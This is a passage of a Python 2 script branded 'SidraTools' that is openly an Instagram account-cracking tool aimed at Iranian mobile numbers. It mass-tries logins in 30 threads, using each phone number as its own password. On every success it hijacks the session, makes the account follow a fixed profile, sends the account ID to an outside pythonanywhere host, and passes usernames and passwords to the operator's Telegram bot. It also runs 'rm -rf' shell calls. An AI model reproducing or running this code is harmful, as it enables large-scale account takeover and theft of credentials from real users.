password = raw_input('          \033[1;93mTOOL PASSWORD: '+E)
print E
if password == "" :
  sys.exit()
if password in str(re.text):
  print(H+" FIRST STEP Is Done.Logged in Successfully as ")
  time.sleep(1)
  print "\033[1;93m "
  print("\033[1;93mPlease Wait 5 Minutes, All Packages Are Checking...")
  time.sleep(1)
else:
  print " Wrong Password !"
  os.system('xdg-open https://SidraTools/1')
  sys.exit()
os.system("clear")
print(TB+"\n")
ID = raw_input(A+'('+E+'⌯'+A+')'+H+' ID Telegram: \n'+L) 
token = raw_input(A+'('+E+'⌯'+A+')'+H+' Token Bot: \n'+L)  

def SidraELEzz():
	os.system('clear')
	print BT
	print "{}({}1{}){}  Random Mobile Iran {}({}901-914{})".format(A,E,A,C,A,E,A)
	print "{}({}2{}){}  Random Mobile Iran {}({}915-932{})".format(A,E,A,C,A,E,A)
	print "{}({}3{}){}  Random Mobile Iran {}({}933-992{})".format(A,E,A,C,A,E,A)
	print "{}({}0{}){}  Exit ".format(A,E,A,A)
	
	print(25 * '\033[1;94m_')
	Hack()




def Hack():
	TOOLS = raw_input(A+"("+E+"⌯"+A+")"+B+ " Choose Checker :"+C)
	if TOOLS =='':
		print '[!] Fill in correctly'
		Hack()
	elif TOOLS =="1":
		os.system("clear") 
		print BT
		print "{}      THE TOOL IS HACK INSTA FROM IRAN".format(E)
		print 50 * '\033[1;94m_'
		print E
		print "{}          901, 902, 903, 904, 905".format(C)
		print "{}          910, 911, 912, 913, 914".format(C)
		print E
		print 50 * '\033[1;94m_'
		print
		try:
			
			R = raw_input(A+"("+E+"⌯"+A+")"+H+ " Choose Area Code :"+C)
			Y = "+98"
			
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			SidraELEzz()
	elif TOOLS =="2":
		os.system("clear") 
		print BT
		print "{}      THE TOOL IS HACK INSTA FROM IRAN".format(E)
		print 50 * '\033[1;94m_'
		print E
		print "{}          915, 916, 917, 918, 920".format(C)
		print "{}          921, 922, 930, 931, 932".format(C)
		print E
		print 50 * '\033[1;94m_'
		print
		try:
			
			R = raw_input(A+"("+E+"⌯"+A+")"+H+ " Choose Area Code :"+C)
			Y = "+98"
			
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			SidraELEzz()
	elif TOOLS =="3":
		os.system("clear") 
		print BT
		print "{}      THE TOOL IS HACK INSTA FROM IRAN".format(E)
		print 50 * '\033[1;94m_'
		print E
		print "{}          933, 934, 935, 936, 937".format(C)
		print "{}          938, 939, 990, 991, 992".format(C)
		print E
		print 50 * '\033[1;94m_'
		print
		try:
			
			R = raw_input(A+"("+E+"⌯"+A+")"+H+ " Choose Area Code :"+C)
			Y = "+98"
			
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			SidraELEzz()
	
	elif TOOLS =='0':
		exb()
	else:
		print '[!] Fill in correctly'
		Hack()

	xxx = str(len(id))
	psb (A+"("+E+"⌯"+A+")"+E+ " Total Numbers: "+B+xxx)
	time.sleep(0.5)
	psb (A+"("+E+"⌯"+A+")"+C+ " Please wait, process is running ... ")
	time.sleep(0.5)
	psb (A+"("+E+"⌯"+A+")"+E+ " To Stop Process Press"+A+ " CTRL"+E+ " Then Press"+A+" z")
	time.sleep(0.5)
	print 50 * '\033[1;94m_'
	print""
	
			
	def main(arg):

		
		global cpb,oks,ok,cp,sk,API,server,vpn
		user = arg
		try:
			os.system('rm -rf ....')
		except OSError:
			pass
		try:
			pass1 = user
			uid = str(uuid4())
			url = "https://i.instagram.com/api/v1/accounts/login/"
			data = {'uuid':uid,'password':pass1,'username':Y+R+user,'device_id':uid,'from_reg':'false','_csrftoken':'missing','login_attempt_countn':'0'}
			login = requests.post(url,headers=API["hadres"],data=data,allow_redirects=True,verify=True)
			if str("logged_in_user") in login.text:
				ok+=1
				APK = login.cookies['sessionid']
				HPI = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '0','content-type': 'application/x-www-form-urlencoded','cookie': 'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-45no7B-A6FA-6F83AD1717DE; ig_nrcb=1; csrftoken=wYPaFI4U1osqOiXc2Tv5vOsNgTdBwrxi; ds_user_id=46165248972; sessionid='+str(APK),'origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/_papulakam__0/follow/','sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"','sec-ch-ua-mobile': '?0','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': str(vpn),'x-csrftoken': 'wYPaFI4U1osqOiXc2Tv5vOsNgTdBwrxi','x-ig-app-id': '936619743392459','x-ig-www-claim': 'hmac.AR0EWvjix_XsqAIjAt7fjL3qLwQKCRTB8UMXTGL5j7pkgYkq','x-instagram-ajax': '753ce878cd6d','x-requested-with': 'XMLHttpRequest'} 
				BPK = {'__a': '1'}
				UPK = "https://www.instagram.com/web/friendships/44727257007/follow/"
				try:
					requests.post(UPK,headers=HPI)
				except:pass
				HPK = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'ar,en-US;q=0.9,en;q=0.8','cookie': 'ig_did=3E70DB93-4A27-43EB-8463-E0BFC9B02AE1; mid=YCAadAALAAH35g_7e7h0SwBbFzBt; ig_nrcb=1; csrftoken=Zc4tm5D7QNL1hiMGJ1caLT7DNPTYHqH0; ds_user_id=45334757205; sessionid='+str(APK)+'; rur=VLL','referer': 'https://www.instagram.com/accounts/edit/','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','User-Agent': str(vpn),'x-ig-app-id': '936619743392459','x-ig-www-claim': 'hmac.AR3P8eA45g5ELL3lqdIm-DHKY2MSY_kGWkN0tGEwG2Ks9Ncl','x-requested-with': 'XMLHttpRequest'} 
				UKP = "https://www.instagram.com/accounts/edit/?__a=1"
				APR = requests.get(UKP, data=BPK, headers=HPK)
				USE = str(APR.json()['form_data']['username'])
				URL = 'https://www.instagram.com/'+str(USE)+'/?__a=1'
				req = requests.get(url=URL, headers=API["Headers"]).json()
				id = str(req['graphql']['user']['id'])
				followers = str(req['graphql']['user']['edge_followed_by']['count'])
				following = str(req['graphql']['user']['edge_follow']['count'])
				lok = requests.get("https://o7aa.pythonanywhere.com/?id="+str(id))   
				iok = lok.json()
				daata = iok['data'] 
				Cod_Sidra_telegram(" ⌯ Instagram Account ✓ ⌯ \n. — — — — —  — — — — — .\n⌯ Username : " +str(USE)+"\n⌯ Password : " +str(pass1)+" \n⌯ Followers : " +str(followers)+"\n⌯ Following : " +str(following)+"\n⌯ Data : " +str(daata)+"\n. — — — — —  — — — — — .\n ⚖️ Tele : @SidraTools")
				print '\033[1;92m [INSTA-OK] ' + Y + R + user + ' | ' + pass1+'\n'+"\n"
				try:os.system('rm -rf ....')
				except:pass
				f=open('Ok.txt','a')
				f.write(Cod_Sidra_telegram+"\n")
				f.close()
				
			else:
				if str('"message":"challenge_required","challenge"') in login.text:
					cp+=1
					Cod_Sidra_telegram(" ⌯ Instagram Account ✓ ⌯ \n. — — — — —  — — — — — .\n⌯ Username : " +Y+R+user+"\n⌯ Password : " +str(pass1)+" \n. — — — — —  — — — — — .\n ⚖️ Tele : @SidraTools")
					print '\x1b[1;90m[INSTA-CP] ' + Y + R + user + ' | ' + pass1+'\n'+"\n"
				else:
					pass2="0"+R+user
					uid = str(uuid4())
					url = "https://i.instagram.com/api/v1/accounts/login/"
					deat = {'uuid':uid,'password':pass2,'username':Y+R+user,'device_id':uid,'from_reg':'false','_csrftoken':'missing','login_attempt_countn':'0'}
					log = requests.post(url,headers=API["hadres"],data=deat,allow_redirects=True,verify=True)
					if str("logged_in_user") in log.text:
						
						ok+=1
						APK = log.cookies['sessionid']
						HPI = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '0','content-type': 'application/x-www-form-urlencoded','cookie': 'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-45no7B-A6FA-6F83AD1717DE; ig_nrcb=1; csrftoken=wYPaFI4U1osqOiXc2Tv5vOsNgTdBwrxi; ds_user_id=46165248972; sessionid='+str(APK),'origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/_papulakam__0/follow/','sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"','sec-ch-ua-mobile': '?0','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': str(vpn),'x-csrftoken': 'wYPaFI4U1osqOiXc2Tv5vOsNgTdBwrxi','x-ig-app-id': '936619743392459','x-ig-www-claim': 'hmac.AR0EWvjix_XsqAIjAt7fjL3qLwQKCRTB8UMXTGL5j7pkgYkq','x-instagram-ajax': '753ce878cd6d','x-requested-with': 'XMLHttpRequest'} 
						BPK = {'__a': '1'}
						UPK = "https://www.instagram.com/web/friendships/44727257007/follow/"
						try:
							requests.post(UPK,headers=HPI)
							
						except:pass
						HPK = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'ar,en-US;q=0.9,en;q=0.8','cookie': 'ig_did=3E70DB93-4A27-43EB-8463-E0BFC9B02AE1; mid=YCAadAALAAH35g_7e7h0SwBbFzBt; ig_nrcb=1; csrftoken=Zc4tm5D7QNL1hiMGJ1caLT7DNPTYHqH0; ds_user_id=45334757205; sessionid='+str(APK)+'; rur=VLL','referer': 'https://www.instagram.com/accounts/edit/','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','User-Agent': str(vpn),'x-ig-app-id': '936619743392459','x-ig-www-claim': 'hmac.AR3P8eA45g5ELL3lqdIm-DHKY2MSY_kGWkN0tGEwG2Ks9Ncl','x-requested-with': 'XMLHttpRequest'} 
						UKP = "https://www.instagram.com/accounts/edit/?__a=1"
						APR = requests.get(UKP, data=BPK, headers=HPK)
						USE = str(APR.json()['form_data']['username'])
						URL = 'https://www.instagram.com/'+USE+'/?__a=1'
						req = requests.get(url=URL, headers=API["Headers"]).json()
						id = str(req['graphql']['user']['id'])
						followers = str(req['graphql']['user']['edge_followed_by']['count'])
						following = str(req['graphql']['user']['edge_follow']['count'])
						lok = requests.get("https://o7aa.pythonanywhere.com/?id="+str(id))   
						iok = lok.json()
						daata = iok['data'] 
						Cod_Sidra_telegram(" ⌯ Instagram Account ✓ ⌯ \n. — — — — —  — — — — — .\n⌯ Username : " +str(USE)+"\n⌯ Password : " +str(pass2)+" \n⌯ Followers : " +str(followers)+"\n⌯ Following : " +str(following)+"\n⌯ Data : " +str(daata)+"\n. — — — — —  — — — — — .\n ⚖️ Tele : @SidraTools")
						print '\033[1;92m [INSTA-OK] ' + Y + R + user + ' | ' + pass2+'\n'+"\n"
						try:os.system('rm -rf ....')
						except:pass
						f=open('Ok.txt','a')
						f.write(Cod_Sidra_telegram+"\n")
						f.close()
							
					else:
						if str('"message":"challenge_required","challenge"') in log.text:
							cp+=1
							
							Cod_Sidra_telegram(" ⌯ Instagram Account ✓ ⌯ \n. — — — — —  — — — — — .\n⌯ Username : " +Y+R+user+"\n⌯ Password : " +str(pass2)+" \n. — — — — —  — — — — — .\n ⚖️ Tele : @SidraTools")
							print '\x1b[1;90m[INSTA-CP] ' + Y + R + user + ' | ' + pass2+'\n\n'
						
					
		except:pass
		
		
	
	p = ThreadPool(30)
	p.map(main, id)
	raw_input('\n[Press Enter To Go Back]')
	os.system('python2 API.py')
		
if __name__ == '__main__':
	SidraELEzz()


            
            
            
            
            
                

